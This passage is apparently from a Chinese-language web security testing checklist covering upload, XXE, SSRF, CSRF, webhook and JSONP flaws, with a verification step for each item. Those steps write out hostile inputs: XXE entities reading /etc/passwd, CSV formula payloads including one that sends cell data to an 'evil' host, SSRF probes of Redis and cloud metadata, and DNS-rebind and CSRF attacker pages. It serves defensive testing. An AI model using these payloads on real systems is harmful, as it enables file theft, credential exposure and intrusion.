| XML / DTD / SVG 上传走专用解析器禁用外部实体 | 否则就是 XXE 上传 | 上传含 `<!ENTITY x SYSTEM "file:///etc/passwd">` 的 SVG / docx 看响应或带外日志 |
| 解压缩接口必须限制单文件展开后大小与 zip-bomb | 1KB → 1GB DoS | 上传一个 `42.zip` 类压缩炸弹，监控服务端 CPU/磁盘 |
| CSV / XLSX 内容做公式注入过滤 (=, +, -, @ 开头) | `=SYSTEM("calc")` 在 Excel 宏环境执行 | 提交 `=cmd|'/c calc'!A1`、`=HYPERLINK("http://evil/?"&A1, "click")` 看下载方实际表现 |
| 高并发上传不存在"上传中"窗口，可绕过病毒扫描或清理 | 高并发下 AV 来不及扫，恶意文件短暂可访问 | 用 Burp Intruder 并发上传同一恶意文件并并发请求该 URL，看是否抓到执行窗口 |
| 上传接口同样受频率限制和身份验证 | 内网/后台上传是 webshell 主路径 | 删 cookie / 用低权限账号尝试上传，看是否拒绝 |

参考：SKILL.md §11.8、`upload-insecure-files` skill。

---

## 17. CSRF / SSRF / XXE / Out-of-Band / 网络层逻辑

| Item | why | verify |
|---|---|---|
| XML 解析器禁用外部实体 / DTD 加载 / 参数实体 | 否则一行 `<!ENTITY x SYSTEM "file:///etc/passwd">` 即任意文件读取 | Body 注入含 `<!DOCTYPE>` 与 `SYSTEM` 实体的 XML，看响应是否回显 `/etc/passwd` |
| XXE 盲注：响应不回显时仍走带外通道排查 | 不回显 ≠ 不存在；OOB 仍可窃数据 | 在 Burp Collaborator / DNSLog 配 DTD，构造参数实体 → 监听是否收到目标外联 |
| 任意"导入 URL / 拉取图片 / Webhook 回调 / 预览链接"接口禁用 `file://` / `gopher://` / `dict://` / `jar://` / `php://` 协议 | 否则 SSRF 全套：读本地文件、攻击内网、命令执行 | 把 URL 改 `file:///etc/passwd`、`gopher://127.0.0.1:6379/_INFO`、`http://169.254.169.254/`，看响应或带外 |
| URL 输入做"DNS resolve + 解析后再校验"，禁止解析到内网 IP / 保留段 | 仅匹配字符串可被 DNS rebind 或 `127.0.0.1.nip.io` 绕过 | 用 `http://attacker.tld`（A 记录指向 169.254.169.254）发 SSRF，重定向到内网看是否打通 |
| 重定向跟随的 URL 同样走 SSRF 校验，不能"首跳合法→302→内网" | 多数 SSRF 通过 302 跳板成立 | 攻击者域名返回 `302 Location: http://127.0.0.1:8500/`，看目标是否跟随 |
| 状态变更接口（支付、提现、改密、改邮箱、删数据）有 Anti-CSRF Token + SameSite + Origin/Referer 三重 | 缺一即可被恶意页面静默触发 | 写一个 attacker.html 含自动提交 form 指向目标接口，浏览器登录后访问看是否触发 |
| Webhook / 支付回调 / 第三方通知接口校验签名 + 时间戳 + 来源 IP 白名单 | 否则可本地伪造支付成功通知 | 抓真实回调请求，本地修改订单号/金额后直接 POST 给回调 URL，看订单状态 |
| JSONP 回调与跨域读接口不返回敏感用户数据 | JSONP 即可被跨域 `<script>` 拉取 → 绕过 SOP | 在 attacker 页面用 `<script src="https://target/api/jsonp?cb=x">`，看是否能拿到 user 数据 |
| 出网请求出口走"白名单 + 出口防火墙"策略 | 内部资产可被打到云元数据 / 内网中间件 | 用 `http://169.254.169.254/latest/meta-data/`（AWS）/ `http://metadata.google.internal/` 探云元数据 |
| 盲注类漏洞日常排查标配带外平台（DNSLog / Collaborator / interactsh） | 单纯靠回显遗漏盲点 | 注入 payload 嵌入随机子域名，监控该域名是否被解析 |

参考：SKILL.md §11.9。

---

## 15. Methodology summary / 复测节奏

每个项目最少跑两轮：

1. **第一轮**：从上到下完整跑 0~14 节，每条都试一下，无脑勾选。
2. **第二轮**：把第一轮挂红的（疑似漏洞）拿到 [METHODOLOGY.md §6.1 三个追问](./METHODOLOGY.md) 复盘，每条跑业务侧验证（看 VIP 真增加了吗？钱真扣别人的吗？数据真返了不该返的吗？）。

报告时按"业务影响 > 技术细节"排序：财损 / 接管 / 隐私泄露 → 越权 / 信息泄露 → DoS / UX 缺陷。

---

## References / 参考

- [METHODOLOGY.md](./METHODOLOGY.md) — 五阶段方法论 / 单页决策树
- [SKILL.md](./SKILL.md) — 业务逻辑漏洞 attack playbook
- [SCENARIOS.md](./SCENARIOS.md) — 支付/竞态/找回密码/枚举/上传细化场景
- 蒸馏原始素材（外部）：业务逻辑漏洞 PDF 教材 / 业务逻辑漏洞 checklist 教材 / 业务逻辑漏洞审计课程录像 / 2022 业务逻辑漏洞专题课程
